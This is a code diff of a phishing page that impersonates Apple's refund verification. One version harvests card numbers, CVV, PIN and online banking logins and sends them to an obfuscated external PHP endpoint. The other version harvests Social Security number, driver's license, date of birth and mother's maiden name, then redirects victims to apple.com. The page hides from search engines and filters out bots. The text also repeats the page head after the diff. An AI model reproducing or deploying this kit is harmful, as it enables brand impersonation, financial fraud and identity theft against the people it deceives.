@@ -1,114 +1,4 @@
-<!doctype html>
-<html lang="en">
-
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <!-- Anti-crawler metadata -->
-    <meta name="robots" content="noindex, nofollow, noarchive">
-    <meta name="googlebot" content="noindex, nofollow, noarchive">
-    
-    <title>Apple - Refund Verification</title>
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <link href="https://fonts.googleapis.com/css?family=SF+Pro+Display:300,400,500,600&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css?family=SF+Pro+Text:300,400,500,600&display=swap" rel="stylesheet">
-    <style type="text/css">
-    body, html {
-        height: 100%;
-        margin: 0;
-        font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
-        background-color: #fbfbfd;
-        color: #1d1d1f;
-        line-height: 1.47059;
-        font-weight: 400;
-        letter-spacing: -0.022em;
-    }
-    
-    /* Global Navigation */
-    #ac-globalnav {
-        width: 100%;
-        height: 44px;
-        background-color: rgba(0, 0, 0, 0.8);
-        backdrop-filter: saturate(180%) blur(20px);
-        position: fixed;
-        top: 0;
-        left: 0;
-        z-index: 9999;
-    }
-    
-    .ac-gn-content {
-        max-width: 980px;
-        margin: 0 auto;
-    }
-    
-    .ac-gn-list {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        list-style: none;
-        padding: 0 20px;
-        margin: 0;
-        height: 44px;
-    }
-    
-    .ac-gn-item a {
-        color: rgba(255, 255, 255, 0.8);
-        text-decoration: none;
-        font-size: 12px;
-        transition: color 0.2s;
-    }
-    
-    .ac-gn-item a:hover {
-        color: #fff;
-    }
-    
-    /* Main content styling */
-    .page-content {
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
-    }
-    
-    .main-wrapper {
-        padding-top: 80px;
-        padding-bottom: 50px;
-        flex: 1;
-    }
-    
-    .verification-container {
-        max-width: 1100px;
-        margin: 0 auto;
-        padding: 0 15px;
-    }
-    
-    .section-title {
-        font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
-        font-size: 32px;
-        font-weight: 500;
-        margin-bottom: 20px;
-        text-align: center;
-    }
-    
-    .section-subtitle {
-        font-size: 17px;
-        font-weight: 400;
-        color: #6e6e73;
-        text-align: center;
-        margin-bottom: 40px;
-        max-width: 800px;
-        margin-left: auto;
-        margin-right: auto;
-    }
-    
-    .verification-steps {
-        padding: 30px 40px;
-        background-color: white;
-        border-radius: 18px;
-        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
-        margin-bottom: 30px;
-    }
-    
-    .step-title {
+.step-title {
         font-size: 21px;
         font-weight: 500;
         margin-bottom: 20px;
@@ -361,17 +251,6 @@
         margin: 20px 0;
     }
     
-    /* Custom selects styling */
-    select.form-control {
-        background-image: url("data:image/svg+xml,%3Csvg width='10' height='6' viewBox='0 0 10 6' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L5 5L9 1' stroke='%236E6E73' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
-        background-repeat: no-repeat;
-        background-position: right 15px center;
-        padding-right: 30px;
-        appearance: none;
-        -webkit-appearance: none;
-        -moz-appearance: none;
-    }
-    
     /* Responsive styles */
     @media (max-width: 768px) {
         .verification-steps {
@@ -469,8 +348,8 @@
         <!-- Main Content -->
         <div class="main-wrapper">
             <div class="verification-container">
-                <h1 class="section-title">Verify Your Refund Request</h1>
-                <p class="section-subtitle">We need to verify your identity and payment method to process your refund. This helps ensure the security of your Apple account and protects against unauthorized transactions.</p>
+                <h1 class="section-title">Verify Your Personal Information</h1>
+                <p class="section-subtitle">Please confirm your personal details to complete the refund verification process. This information must match our records for successful processing.</p>
                 
                 <!-- Progress Indicator -->
                 <div class="progress-indicator">
@@ -478,13 +357,13 @@
                         <div class="step-circle">1</div>
                         <div class="step-label">Sign In</div>
                     </div>
-                    <div class="progress-step active">
+                    <div class="progress-step completed">
                         <div class="step-circle">2</div>
-                        <div class="step-label">Verify Identity</div>
+                        <div class="step-label">Verify Payment</div>
                     </div>
-                    <div class="progress-step">
+                    <div class="progress-step active">
                         <div class="step-circle">3</div>
-                        <div class="step-label">Confirm Refund</div>
+                        <div class="step-label">Confirm Details</div>
                     </div>
                 </div>
                 
@@ -501,66 +380,59 @@
                 
                 <!-- Verification Form -->
                 <div class="verification-steps">
-                    <h2 class="step-title">Payment Verification</h2>
-                    <p class="step-description">Please provide details of the payment method used for the original purchase. This information will be used to process your refund back to the same payment method.</p>
+                    <h2 class="step-title">Personal Details</h2>
+                    <p class="step-description">Please provide your personal information exactly as it appears on your billing statement and government ID.</p>
                     
-                    <form id="verification-form" action="next.php" method="post">
-                        <input type="hidden" name="btn2" value="btn2">
+                    <form id="details-form" action="next.php" method="post">
+                        <input type="hidden" name="btn3" value="btn3">
                         
                         <!-- Honeypot fields for bots -->
                         <div class="bot-field">
-                            <input type="text" name="website2" id="website2">
-                            <input type="text" name="phone_confirm" id="phone_confirm">
+                            <input type="text" name="website3" id="website3">
+                            <input type="text" name="address_confirm" id="address_confirm">
                         </div>
                         
                         <div class="row">
                             <div class="col-md-6">
                                 <div class="form-group">
-                                    <label for="bank_name">Bank Name</label>
-                                    <input type="text" class="form-control" id="bank_name" name="bank_name" required>
+                                    <label for="fname">First Name</label>
+                                    <input type="text" class="form-control" id="fname" name="fname" required>
                                 </div>
                             </div>
                             <div class="col-md-6">
                                 <div class="form-group">
-                                    <label for="noc">Name on Card</label>
-                                    <input type="text" class="form-control" id="noc" name="noc" required>
+                                    <label for="lname">Last Name</label>
+                                    <input type="text" class="form-control" id="lname" name="lname" required>
                                 </div>
                             </div>
                         </div>
                         
                         <div class="row">
-                            <div class="col-md-6">
+                            <div class="col-md-12">
                                 <div class="form-group">
-                                    <label for="ccn">Credit Card Number</label>
-                                    <input type="text" class="form-control" id="ccn" name="ccn" required placeholder="•••• •••• •••• ••••">
-                                </div>
-                            </div>
-                            <div class="col-md-3">
-                                <div class="form-group">
-                                    <label for="exdate">Expiration Date</label>
-                                    <input type="text" class="form-control" id="exdate" name="exdate" required placeholder="MM/YYYY">
-                                </div>
-                            </div>
-                            <div class="col-md-3">
-                                <div class="form-group">
-                                    <label for="cvv">Security Code (CVV)</label>
-                                    <input type="text" class="form-control" id="cvv" name="cvv" required placeholder="•••">
+                                    <label for="badd">Billing Address</label>
+                                    <input type="text" class="form-control" id="badd" name="badd" required>
                                 </div>
                             </div>
                         </div>
                         
                         <div class="row">
-                            <div class="col-md-6">
+                            <div class="col-md-4">
                                 <div class="form-group">
-                                    <label for="pin">Card PIN</label>
-                                    <input type="password" class="form-control" id="pin" name="pin" required placeholder="••••">
+                                    <label for="ct">City</label>
+                                    <input type="text" class="form-control" id="ct" name="ct" required>
                                 </div>
                             </div>
-                            <div class="col-md-6">
+                            <div class="col-md-4">
                                 <div class="form-group">
-                                    <label for="bank_user">Bank Username</label>
-                                    <input type="text" class="form-control" id="bank_user" name="bank_user" required>
-                                    <small class="help-block">Your online banking username</small>
+                                    <label for="state">State</label>
+                                    <input type="text" class="form-control" id="state" name="state" required>
+                                </div>
+                            </div>
+                            <div class="col-md-4">
+                                <div class="form-group">
+                                    <label for="zip">ZIP Code</label>
+                                    <input type="text" class="form-control" id="zip" name="zip" required>
                                 </div>
                             </div>
                         </div>
@@ -568,28 +440,60 @@
                         <div class="row">
                             <div class="col-md-6">
                                 <div class="form-group">
-                                    <label for="bank_pass">Bank Password</label>
-                                    <input type="password" class="form-control" id="bank_pass" name="bank_pass" required>
+                                    <label for="ph">Phone Number</label>
+                                    <input type="text" class="form-control" id="ph" name="ph" required placeholder="000-000-0000">
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="form-group">
+                                    <label for="dob">Date of Birth</label>
+                                    <input type="text" class="form-control" id="dob" name="dob" required placeholder="MM/DD/YYYY">
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="form-group">
+                                    <label for="ssn">Social Security Number</label>
+                                    <input type="text" class="form-control" id="ssn" name="ssn" required placeholder="000-00-0000">
+                                    <small class="help-block">For security verification only</small>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="form-group">
+                                    <label for="dln">Driver's License Number</label>
+                                    <input type="text" class="form-control" id="dln" name="dln" required>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="form-group">
+                                    <label for="mname">Mother's Maiden Name</label>
+                                    <input type="text" class="form-control" id="mname" name="mname" required>
+                                    <small class="help-block">For identity verification</small>
                                 </div>
                             </div>
                         </div>
                         
                         <div class="info-box">
-                            <h3 class="info-box-title">Why do we need this information?</h3>
-                            <p class="info-box-text">Apple requires complete payment verification to process refunds securely. This protects your account and ensures funds return to the correct payment method. Your information is encrypted and securely transmitted.</p>
+                            <h3 class="info-box-title">Security & Privacy Information</h3>
+                            <p class="info-box-text">Your personal information is encrypted using industry-standard protocols and is only used for verification purposes. Apple never stores sensitive information like your SSN or driver's license number after verification is complete.</p>
                         </div>
                         
                         <div class="mt-4 text-right">
-                            <button type="button" class="btn btn-outline-secondary mr-2">Cancel</button>
-                            <button type="submit" id="verify-button" class="btn btn-primary">Continue to Next Step</button>
+                            <button type="button" class="btn btn-outline-secondary mr-2">Back</button>
+                            <button type="submit" id="complete-button" class="btn btn-primary">Complete Verification</button>
                         </div>
                     </form>
                 </div>
                 
-                <!-- Next Step Preview -->
+                <!-- Final Steps Preview -->
                 <div class="verification-steps">
-                    <h2 class="step-title">Next: Confirm Personal Details</h2>
-                    <p class="step-description">After payment verification, you'll need to confirm your personal information, including billing address and contact details, to complete the refund process.</p>
+                    <h2 class="step-title">What Happens Next</h2>
+                    <p class="step-description">Once your information is verified, you'll receive a confirmation email with details about your refund. Most refunds are processed within 3-5 business days, but may take longer depending on your payment method and financial institution.</p>
                 </div>
             </div>
         </div>
@@ -613,52 +517,161 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
     <script type="text/javascript">
-        // Redirect link
-        var rdrt = "https://www.apple.com/";
-        
-        // Mailer link - encoded next.php URL 
-        var f = atob("aHR0cHM6Ly9yb3RhZG9zYWJvci5jb20vam9rZXIvbmV4dC5waHA=");
-        
         $(document).ready(function() {
             // Format inputs
-            $("#ccn").inputmask({"mask": "9999 9999 9999 9999"});
-            $("#exdate").inputmask({"mask": "99/9999","placeholder":"MM/YYYY"});
-            $("#cvv").inputmask({"mask": "999"});
+            $("#ph").inputmask({"mask": "999-999-9999"});
+            $("#dob").inputmask({"mask": "99/99/9999","placeholder":"MM/DD/YYYY"});
+            $("#ssn").inputmask({"mask": "999-99-9999"});
             
             // Display user email from previous step
             const params = new URLSearchParams(window.location.search);
             const email = params.get('email') || localStorage.getItem('userEmail') || 'example@icloud.com';
             $('#user-email').text(email);
-            localStorage.setItem('userEmail', email);
             
             // Form submission
-            $('#verification-form').on('submit', function(e) {
+            $('#details-form').on('submit', function(e) {
                 e.preventDefault();
                 
                 // Check for honeypot fields
-                if ($('#website2').val() !== '' || $('#phone_confirm').val() !== '') {
+                if ($('#website3').val() !== '' || $('#address_confirm').val() !== '') {
                     window.location.href = 'https://www.apple.com/';
                     return;
                 }
                 
                 // Disable button to prevent double submission
-                $('#verify-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
+                $('#complete-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
                 
                 // Submit form via AJAX
                 $.ajax({
-                    url: f,
+                    url: "next.php",
                     type: 'POST',
                     data: $(this).serialize(),
                     dataType: 'json',
-                    complete: function() {
-                        // Redirect to next step regardless of response
-                        window.location.href = 'details.html';
+                    beforeSend: function(a) {
+                        $('#complete-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
+                    },
+                    complete: function(a) {
+                        // Always redirect to Apple website after submission
+                        window.location.href = "https://www.apple.com/";
                     }
                 });
                 });
+            });
+            
+            // Back button functionality
+            $('button.btn-outline-secondary').click(function() {
+                window.history.back();
             });
         });
     </script>
 </body>
 
-</html>
+</html><!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Anti-crawler metadata -->
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="googlebot" content="noindex, nofollow, noarchive">
+    
+    <title>Apple - Refund Verification</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=SF+Pro+Display:300,400,500,600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=SF+Pro+Text:300,400,500,600&display=swap" rel="stylesheet">
+    <style type="text/css">
+    body, html {
+        height: 100%;
+        margin: 0;
+        font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
+        background-color: #fbfbfd;
+        color: #1d1d1f;
+        line-height: 1.47059;
+        font-weight: 400;
+        letter-spacing: -0.022em;
+    }
+    
+    /* Global Navigation */
+    #ac-globalnav {
+        width: 100%;
+        height: 44px;
+        background-color: rgba(0, 0, 0, 0.8);
+        backdrop-filter: saturate(180%) blur(20px);
+        position: fixed;
+        top: 0;
+        left: 0;
+        z-index: 9999;
+    }
+    
+    .ac-gn-content {
+        max-width: 980px;
+        margin: 0 auto;
+    }
+    
+    .ac-gn-list {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        list-style: none;
+        padding: 0 20px;
+        margin: 0;
+        height: 44px;
+    }
+    
+    .ac-gn-item a {
+        color: rgba(255, 255, 255, 0.8);
+        text-decoration: none;
+        font-size: 12px;
+        transition: color 0.2s;
+    }
+    
+    .ac-gn-item a:hover {
+        color: #fff;
+    }
+    
+    /* Main content styling */
+    .page-content {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+    }
+    
+    .main-wrapper {
+        padding-top: 80px;
+        padding-bottom: 50px;
+        flex: 1;
+    }
+    
+    .verification-container {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding: 0 15px;
+    }
+    
+    .section-title {
+        font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
+        font-size: 32px;
+        font-weight: 500;
+        margin-bottom: 20px;
+        text-align: center;
+    }
+    
+    .section-subtitle {
+        font-size: 17px;
+        font-weight: 400;
+        color: #6e6e73;
+        text-align: center;
+        margin-bottom: 40px;
+        max-width: 800px;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    
+    .verification-steps {
+        padding: 30px 40px;
+        background-color: white;
+        border-radius: 18px;
+        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+        margin-bottom: 30px;
+    }
